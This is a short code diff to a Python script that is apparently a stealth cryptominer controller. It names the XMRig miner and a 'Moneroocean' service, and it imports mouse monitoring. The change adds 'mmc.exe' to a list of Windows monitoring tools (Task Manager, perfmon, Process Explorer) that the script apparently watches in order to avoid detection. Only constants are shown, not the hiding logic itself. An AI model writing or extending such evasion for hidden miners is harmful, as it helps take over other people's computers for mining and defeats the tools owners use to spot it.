@@ -4,7 +4,7 @@ import subprocess
 # from ctypes import windll, Structure, c_ulong, byref, c_ushort
 from pynput.mouse import Controller
 
-SOFTS_NAME = ['Taskmgr.exe', 'perfmon.exe', 'procexp64.exe', 'procexp.exe']
+SOFTS_NAME = ['Taskmgr.exe', 'perfmon.exe', 'procexp64.exe', 'procexp.exe', 'mmc.exe']
 SERVICE_NAME = 'Moneroocean'
 MINER_NAME = ['xmrig.exe']
 
